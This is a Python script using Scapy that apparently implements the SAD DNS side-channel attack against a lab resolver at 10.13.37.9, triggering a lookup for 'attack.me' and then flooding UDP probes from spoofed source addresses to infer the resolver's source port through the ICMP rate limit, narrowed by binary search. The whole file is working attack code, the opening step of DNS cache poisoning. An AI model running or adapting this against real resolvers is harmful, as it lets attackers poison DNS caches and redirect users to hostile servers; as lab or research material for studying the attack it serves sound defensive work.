from scapy.all import *

import random

ICMP_LIMIT_RATE = 50
ICMP_REPLY_WAIT_TIME = .025
START_PORT = 30000
VICTIM_DOMAIN_NAME = "attack.me"

VICTIM_RESOLVER_IP = "10.13.37.9"
VICTIM_RESOLVER_PORT = 53

MY_IP = "10.13.37.6"
MY_SPORT = 9999

KNOWN_BAD_PORTS = [x for x in range(1, 1025)]


global_socket = conf.L2socket(iface='eth0')

def binary_search(arr):
    ports = list(arr)
    while len(ports)!=1:
        print("Binary Search Iteration ", ports)


        mid = len(ports) // 2
        left = ports[:mid]
        right = ports[mid:]

        left_copy = list(ports[:mid])
        while len(left_copy)!=50:
            left_copy.append(random.choice(KNOWN_BAD_PORTS))
    
        left_res = flood(left_copy)
        print("Tried flooding ", left_copy, " got result ", left_res)
        if left_res:
            print("Going left")
            ports = list(left)
        else:
            print("Going Right")
            ports = list(right)
        
        time.sleep(0.1)
        continue

    print("Narrowed down to port: ", ports)
    single_port = list(ports)
    while len(single_port)!=50:
        single_port.append(random.choice(KNOWN_BAD_PORTS))

    return ports[0] if flood(single_port) else None


def generate_random_ipv4():
    return "100.13." + str(random.randint(50, 230))+"." + str(random.randint(50, 230))

def send_initial_query():
    ip_layer = IP(dst=VICTIM_RESOLVER_IP, src=MY_IP)
    udp_layer = UDP(dport=VICTIM_RESOLVER_PORT, sport=MY_SPORT)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=VICTIM_DOMAIN_NAME))
    packet = ip_layer / udp_layer / dns_layer
    send(packet)

def flood(ports):
    time.sleep(0.025)
    probe_packet = []
    for i in ports:
        ip_layer = IP(dst=VICTIM_RESOLVER_IP, src=generate_random_ipv4())
        udp_layer = UDP(dport=i, sport=RandShort())
        packet = Ether() / ip_layer / udp_layer
        probe_packet.append(raw(packet))

    for packet in probe_packet:
        global_socket.send(packet)

    # Verification Packet
    ip_layer = IP(dst=VICTIM_RESOLVER_IP)
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = Ether() / ip_layer / udp_layer

    reply = global_socket.sr1(verification_packet, timeout=ICMP_REPLY_WAIT_TIME, verbose=0)

    return True if reply else False

def main():
    send_initial_query()
    for offset in range(200):
        scan = [x for x in range(START_PORT+(50*offset), START_PORT+ICMP_LIMIT_RATE+(50*offset))]
        res = flood(scan)
        if res:
            print(f"Port Found in {START_PORT+(50*offset)} {START_PORT+ICMP_LIMIT_RATE+(50*offset)}")
            print("Starting Binary Search...")
            sport = binary_search(scan)
            print(f"Found sport: {sport}")

main()